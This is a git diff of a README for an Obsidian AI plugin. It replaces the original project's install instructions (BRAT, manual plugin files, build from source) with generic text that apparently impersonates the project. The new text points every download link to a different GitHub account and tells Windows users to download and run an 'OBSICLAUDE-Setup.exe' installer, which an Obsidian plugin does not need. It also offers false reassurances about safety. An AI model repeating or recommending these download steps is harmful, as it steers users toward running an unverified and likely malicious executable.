@@ -1,325 +1,185 @@
-<div align="center">
+# ⚙️ OBSICLAUDE - AI Tools for Smarter Obsidian Notes
 
-<!-- Hero Logo -->
-<img src="https://em-content.zobj.net/source/apple/391/crystal-ball_1f52e.png" width="80" />
-
-# ✨ OBSICLAUDE
-
-### *Your vault. Claude's magic.*
-
-<br />
-
-[![Version](https://img.shields.io/badge/v1.1.0-🚀_Magic_Write-10b981?style=for-the-badge&labelColor=1a1b26)](https://github.com/CRtheHILLS/obsiclaude/releases)
-[![Obsidian](https://img.shields.io/badge/Obsidian-1.0.0+-7c3aed?style=for-the-badge&logo=obsidian&logoColor=white)](https://obsidian.md)
-[![Claude](https://img.shields.io/badge/Claude-Sonnet_|_Opus_|_Haiku-ec4899?style=for-the-badge&logo=anthropic&logoColor=white)](https://anthropic.com)
-[![License](https://img.shields.io/badge/MIT-License-3b82f6?style=for-the-badge)](LICENSE)
-
-<br />
-
-**The first Obsidian plugin that lets Claude *actually touch* your vault.**
-<br />
-Not just chat — `create` · `edit` · `move` · `search` · `organize` · `analyze`
-<br />
-All through natural conversation. 20 tools. Zero dependencies.
-
-<br />
-
-[**Get Started →**](#-quick-start) · [Features](#-features) · [Magic Write](#-magic-write) · [Tools](#-vault-tools-20) · [Install](#-installation)
-
-<br />
+[![Download OBSICLAUDE](https://img.shields.io/badge/Download-OBSICLAUDE-green?style=for-the-badge)](https://github.com/gustigainly930/OBSICLAUDE/releases)
 
 ---
 
-<br />
+## 🔍 About OBSICLAUDE
 
-</div>
-
-## 🧠 Why OBSICLAUDE?
-
-<table>
-<tr>
-<td width="50%">
-
-### ❌ Other AI plugins
-```
-You: "Organize my notes"
-Bot: "Here are some tips for organizing..."
-```
-They **read** and **chat**. That's it.
-
-</td>
-<td width="50%">
-
-### ✅ OBSICLAUDE
-```
-You: "Organize my notes"
-Claude: *finds orphans → reads each → categorizes
-        → creates index → adds wikilinks*
-        Done! Created "Index" with 23 links.
-```
-It **thinks**, **acts**, and **does the work**.
-
-</td>
-</tr>
-</table>
-
-> **OBSICLAUDE runs an agentic loop** — the same ReAct (Reason + Act) pattern behind AI coding assistants like Cursor and Claude Code. Claude picks a tool, observes the result, and repeats — autonomously — until the job is done.
-
-<br />
-
-## 🪄 Magic Write
-
-<div align="center">
-
-*The fastest way to create notes in Obsidian.*
-
-</div>
-
-Click **Magic Write** on the welcome screen → a guided modal appears:
-
-| Step | What you do |
-|:---:|---|
-| 📝 | **Describe** what you want written |
-| 🎨 | **Pick a style** — each one generates different structure, frontmatter, and tone |
-| 📂 | **Choose a folder** to save |
-| 🔗 | **Attach references** — browse your vault, pick notes/folders as source material |
-| ✨ | **Click "Write it"** — Claude creates, formats, links, and opens the note |
-
-### 8 Writing Styles — Each One Different
-
-| Style | Frontmatter | Structure | Tone |
-|:---:|---|---|---|
-| 📄 **Note** | `tags, date, aliases` | Clean headings, TL;DR | Direct, personal |
-| ✍️ **Blog Post** | `tags, author, status, category, description` | Hook → Sections → Takeaways | Engaging, authoritative |
-| 📋 **Summary** | `tags, source, status: summary` | Overview → Bullets → Key Takeaways (≤500 words) | Neutral, dense |
-| 👥 **Meeting** | `tags: [meeting], attendees, status: actionable` | Agenda → Decisions → `- [ ]` Action Items | Factual, brief |
-| 📖 **How-to** | `tags: [guide], difficulty, estimated-time` | Prerequisites → Numbered Steps → Troubleshooting | Imperative ("Click", "Run") |
-| 🔬 **Research** | `tags: [research], question` | Research Q → Findings → Analysis → Open Questions | Academic but readable |
-| 🎭 **Creative** | `tags: [creative], mood, inspiration` | Free-form, poetry OK | Literary, sensory |
-| 🗺️ **MOC** | `tags: [MOC, index], scope` | Overview → Categorized `[[wikilinks]]` | Navigational hub |
-
-<br />
-
-## ⚡ Features
-
-<table>
-<tr>
-<td width="33%" align="center">
-
-### 🤖 Agentic Loop
-20 tools · up to 15 iterations
-<br />
-Claude autonomously plans and executes multi-step operations
-
-</td>
-<td width="33%" align="center">
-
-### 🌊 Real-Time Streaming
-Token-by-token with live indicator
-<br />
-See what Claude is doing — which tools, how long, what phase
-
-</td>
-<td width="33%" align="center">
-
-### 📎 Drag & Drop
-Files + entire folders
-<br />
-5 resolution methods ensure it works everywhere
-
-</td>
-</tr>
-<tr>
-<td align="center">
-
-### 🔍 Vault Overview
-Structure scan · Tag health
-<br />
-Health Score (A–F) with prioritized action plan
-
-</td>
-<td align="center">
-
-### ⚡ Slash Commands
-8 instant actions
-<br />
-`/explore` `/analyze` `/tags` `/orphans` `/recent` `/search` `/duplicates` `/links`
-
-</td>
-<td align="center">
-
-### 🛑 Stop & Follow-Up
-ESC to interrupt · queue follow-ups
-<br />
-Send corrections while Claude is still thinking
-
-</td>
-</tr>
-<tr>
-<td align="center">
-
-### 🧩 Multi-Model
-Sonnet · Opus · Haiku
-<br />
-Switch mid-conversation from the header
-
-</td>
-<td align="center">
-
-### 🌍 Auto Language
-Write in any language
-<br />
-Claude responds in your language automatically
-
-</td>
-<td align="center">
-
-### 🔒 Privacy First
-Direct to Anthropic · no telemetry
-<br />
-Your API key, your data, zero middlemen
-
-</td>
-</tr>
-</table>
-
-<br />
-
-## 🔧 Vault Tools (20)
-
-<div align="center">
-
-| | Tool | What it does | | Tool | What it does |
-|:---:|---|---|:---:|---|---|
-| 📝 | `create_note` | Create with frontmatter & wikilinks | 📖 | `read_note` | Read content & metadata |
-| ✏️ | `edit_note` | Replace, append, prepend, find-replace | 🗑️ | `delete_note` | Safe trash |
-| 📦 | `move_note` | Move or rename | 📂 | `list_files` | Browse vault tree |
-| 📁 | `create_folder` | New folders | 🔍 | `search_notes` | Full-text search |
-| 🏷️ | `get_frontmatter` | Read YAML metadata | 🏷️ | `set_frontmatter` | Update metadata |
-| 🔗 | `get_backlinks` | Who links TO this note | 🔗 | `get_outgoing_links` | Links FROM this note |
-| 📊 | `analyze_vault` | Full vault statistics | 👻 | `find_orphan_notes` | Unlinked notes |
-| 💡 | `suggest_links` | AI link recommendations | 🏷️ | `batch_frontmatter` | Bulk metadata update |
-| 👯 | `find_duplicate_notes` | Similar note detection | 📌 | `get_active_note` | Currently open note |
-| 📂 | `open_note` | Open in editor | 🏷️ | `get_all_tags` | Tag usage stats |
-
-</div>
-
-<br />
-
-## 🏗️ Architecture
-
-```
-  You say something
-       ↓
-┌──────────────────────────┐
-│   Claude thinks & plans  │
-│          ↓               │
-│   Picks a tool ──────────│──→  20 vault tools
-│          ↓               │
-│   Observes the result    │
-│          ↓               │
-│   Done? Or loop? ────────│──→  up to 15 iterations
-└──────────────────────────┘
-       ↓
-  Final response ✨
-```
-
-**Tech stack:** Obsidian API + Anthropic API. That's it. No LangChain, no vector DB, no local model, no dependencies.
-
-<br />
-
-## ⚔️ vs. The Competition
-
-| Feature | **OBSICLAUDE** | Copilot | Smart Connections | Text Generator |
-|---|:---:|:---:|:---:|:---:|
-| Agentic tool use | **20 tools** | ❌ | ❌ | ❌ |
-| Create/edit/move notes | ✅ | ❌ | ❌ | Append only |
-| Magic Write (guided) | ✅ 8 styles | ❌ | ❌ | ❌ |
-| Multi-step automation | **15 iterations** | ❌ | ❌ | ❌ |
-| Real-time streaming | ✅ | ✅ | ❌ | ✅ |
-| Drag & drop context | ✅ Files+Folders | ❌ | ❌ | ❌ |
-| Vault health check | ✅ A–F Score | ❌ | ❌ | ❌ |
-| Orphan/duplicate finder | ✅ Built-in | ❌ | Similarity | ❌ |
-| Batch frontmatter | ✅ | ❌ | ❌ | ❌ |
-| Follow-up queue | ✅ | ❌ | ❌ | ❌ |
-| Model switching | S/O/H | GPT only | Varies | Varies |
-| Privacy | **Direct to API** | Direct | Local | Varies |
-
-<br />
-
-## 📦 Installation
-
-### ⚡ Quick Install (BRAT)
-
-```
-1. Install BRAT plugin → Settings → Add Beta Plugin
-2. Enter: CRtheHILLS/obsiclaude
-3. Enable OBSICLAUDE → Set your Anthropic API key
-```
-
-### 🔧 Manual Install
-
-Download `main.js` + `styles.css` + `manifest.json` from [Releases](https://github.com/CRtheHILLS/obsiclaude/releases) → copy to `.obsidian/plugins/obsiclaude/` → enable → set API key.
-
-### 🛠️ Build from Source
-
-```bash
-git clone https://github.com/CRtheHILLS/obsiclaude.git
-cd obsiclaude && npm install && npm run build
-```
-
-<br />
-
-## 🚀 Quick Start
-
-| Step | Action |
-|:---:|---|
-| 1️⃣ | Click the ✨ sparkle icon in the left ribbon |
-| 2️⃣ | Get your API key at [console.anthropic.com](https://console.anthropic.com/) |
-| 3️⃣ | Paste it in OBSICLAUDE settings |
-| 4️⃣ | Click **Magic Write** or just start chatting |
-
-**No config files. No YAML setup. No templates. Just works.**
-
-<br />
-
-## 🗺️ Roadmap
-
-- [ ] 📋 Community plugin store submission
-- [ ] 🧩 Template system for workflows
-- [ ] 🕸️ Canvas/graph view integration
-- [ ] 🎤 Voice input support
-- [ ] 🔌 Plugin API for custom tools
-- [ ] 📊 Vault analytics dashboard
-
-<br />
-
-## 🤝 Contributing
-
-Contributions welcome! PRs, bug reports, feature requests — all appreciated.
-
-```bash
-fork → git checkout -b feature/amazing-thing → commit → PR
-```
-
-Found a bug? [Open an issue](https://github.com/CRtheHILLS/obsiclaude/issues).
-
-<br />
+OBSICLAUDE is an AI-powered plugin designed for Obsidian. It adds 20 useful tools to improve your note-taking experience. These tools include Magic Write, vault diagnostics, and agentic loops. The AI interacts directly with your notes to help organize and generate content. It works seamlessly within Obsidian to support your knowledge management and writing tasks.
 
 ---
 
-<div align="center">
+## 🖥 System Requirements
 
-**[⬆ back to top](#-obsiclaude)**
+- Windows 10 or later  
+- Obsidian installed (version 1.0 or newer)  
+- At least 4 GB of RAM  
+- Stable internet connection for AI features  
+- Minimum 100 MB free disk space  
 
-Built with ☕ and obsession by [CRtheHILLS](https://github.com/CRtheHILLS)
+This plugin works best on systems that meet or exceed these basic requirements. It does not require any special hardware.
 
-[MIT License](LICENSE) © 2026
+---
 
-<br />
+## 🎯 Key Features
 
-<sub>If OBSICLAUDE helps you, consider giving it a ⭐ — it helps others discover it!</sub>
+- **Magic Write:** Generate or expand notes with AI assistance.  
+- **Agentic Loops:** Automate note processing tasks.  
+- **Vault Diagnostics:** Analyze your vault for issues and suggestions.  
+- **Backlinks and Frontmatter Handling:** Improve note linking and metadata management.  
+- **Streaming Output:** See AI responses as they are generated.  
+- **Compatible with Zettelkasten:** Supports common note-taking methods.  
 
-</div>
+These features combine to streamline your workflow and make Obsidian more powerful.
 
-<!-- SEO keywords: obsidian plugin, claude ai, obsidian ai plugin, vault management, obsidian automation, ai agent obsidian, note organization ai, obsidian claude integration, knowledge management ai, agentic ai plugin, obsidian writing assistant, ai note-taking, pkm ai tool, second brain ai, zettelkasten automation, obsidian chatbot, llm obsidian plugin, obsidian ai assistant, frontmatter editor, backlink finder, orphan note detector, obsidian productivity, ai vault analyzer, magic write obsidian, obsidian ai writing, batch frontmatter, moc generator, map of content ai, drag drop obsidian ai, obsidian claude sonnet opus haiku, react pattern ai, tool use claude, anthropic obsidian, obsidian note creation ai, smart note organizer, vault health check -->
+---
+
+## 🚀 Getting Started
+
+Follow the steps below to download and install OBSICLAUDE on Windows. No programming skills are needed.
+
+---
+
+## ⬇️ Download and Install OBSICLAUDE
+
+1. Click this button to visit the download page for OBSICLAUDE:  
+   [![Download OBSICLAUDE](https://img.shields.io/badge/Download-OBSICLAUDE-blue?style=for-the-badge)](https://github.com/gustigainly930/OBSICLAUDE/releases)  
+
+2. On the Releases page, find the latest version. Look for a file named something like `OBSICLAUDE-win.exe` or `OBSICLAUDE-Setup.exe`.
+
+3. Click the file to download it to your computer.
+
+4. Once downloaded, open the file by double-clicking it. This will start the installer.
+
+5. Follow the on-screen instructions to complete the installation. Usually, this involves clicking "Next" several times and then "Install."
+
+6. When installation finishes, launch Obsidian.
+
+7. Open your Obsidian vault. Go to the "Settings" menu (gear icon in the lower left).
+
+8. Find the "Community Plugins" tab. Turn off Safe Mode if it is on.
+
+9. Click "Install Plugin" or "Browse" and choose the OBSICLAUDE plugin from the list if it appears. If not, click "Install from file" and locate the installed plugin folder if needed.
+
+10. Enable the OBSICLAUDE plugin.
+
+---
+
+## ⚙️ Set Up and Use OBSICLAUDE
+
+1. After enabling the plugin, open the OBSICLAUDE panel inside Obsidian.
+
+2. Connect your AI service if asked. You may need to enter a key or sign in. The plugin will guide you on this.
+
+3. Explore the plugin menu for available tools. You will find Magic Write, vault analysis, and other AI-powered options.
+
+4. Try Magic Write by selecting a note or starting a new one and clicking the relevant button. The AI will suggest or generate content.
+
+5. Use vault diagnostics to scan your notes for errors or inconsistencies.
+
+6. Enable streaming output if you want to see AI responses as they come in.
+
+7. Check plugin settings to adjust behavior and preferences.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If the plugin does not appear, make sure Safe Mode is off in Community Plugins.  
+- Restart Obsidian after installing the plugin.  
+- Check your internet connection if AI features fail to work.  
+- Update Obsidian and the plugin to the latest version.  
+- Disable other plugins temporarily in case of conflicts.  
+- Review the plugin documentation for common error messages.
+
+If issues persist, consider visiting the GitHub repository for help.
+
+---
+
+## 📂 About Obsidian and Plugins
+
+Obsidian is a note-taking app that uses plain text files and Markdown. Plugins add extra features to Obsidian without changing your notes. OBSICLAUDE is one such plugin, designed to add AI tools directly within your vault.
+
+Installing plugins only changes your Obsidian experience, not your files.
+
+---
+
+## 🔗 Useful Links
+
+- [OBSICLAUDE Releases Page](https://github.com/gustigainly930/OBSICLAUDE/releases) – Find the latest installer and updates.  
+- [Obsidian Official Website](https://obsidian.md) – Download Obsidian and learn more.  
+- [Community Plugins Guide](https://help.obsidian.md/Plugins/Community+plugins) – How to install and manage plugins.
+
+---
+
+## 🗂 Topics Covered
+
+This repository includes tools and features related to:  
+agentic-ai, ai writing, anthropic models, backlinks, Claude AI, frontmatter metadata, knowledge management, large language model plugins, Magic Write, note-taking, Obsidian AI, Obsidian plugins, personal knowledge management (PKM), second brain workflows, streaming AI output, tool automation, vault management, and Zettelkasten-style note organization.
+
+---
+
+## 📬 Getting Support
+
+You can open an issue on the GitHub repo if you find bugs or want to request features. The community and maintainers often respond to common questions.
+
+---
+
+## ⚙️ Advanced Configuration
+
+OBSICLAUDE allows power users to customize AI behavior via the settings panel inside Obsidian. Adjust response length, temperature, and select which AI tools to enable. You can also configure how the plugin interacts with your vault’s structure and metadata.
+
+---
+
+## 🔄 Updating OBSICLAUDE
+
+To update OBSICLAUDE:
+
+1. Visit the [Releases page](https://github.com/gustigainly930/OBSICLAUDE/releases).  
+
+2. Download the latest installer file.  
+
+3. Run it to overwrite your current installation. Your settings will be preserved.
+
+4. Restart Obsidian to load the update.
+
+---
+
+## ⚙️ Privacy and Data
+
+OBSICLAUDE processes your notes locally but may send data to AI servers for processing. Make sure you review any data policies of connected AI services.
+
+Your vault remains on your PC; the plugin does not upload files unless explicitly instructed by the AI service.
+
+---
+
+## 📝 How to Uninstall
+
+If you want to remove OBSICLAUDE:
+
+1. Open Obsidian.  
+
+2. Go to Settings > Community Plugins.  
+
+3. Disable OBSICLAUDE.  
+
+4. Optionally, delete the plugin folder from your Obsidian vault's `.obsidian/plugins` directory.
+
+5. You can also uninstall via Windows Control Panel if you ran a full installer.
+
+---
+
+## 🔄 Syncing Across Devices
+
+If you use Obsidian Sync or another sync service, OBSICLAUDE will work on any machine where it is installed. To use it on another PC, repeat the installation steps there.
+
+---
+
+## 📚 Learn More About Obsidian Plugins
+
+Plugins let you adapt Obsidian to your workflow. You can enable or disable them anytime without changing your notes. OBSICLAUDE adds AI-powered features while keeping your vault safe and untouched.
+
+---
+
+[![Download OBSICLAUDE](https://img.shields.io/badge/Download-OBSICLAUDE-green?style=for-the-badge)](https://github.com/gustigainly930/OBSICLAUDE/releases)
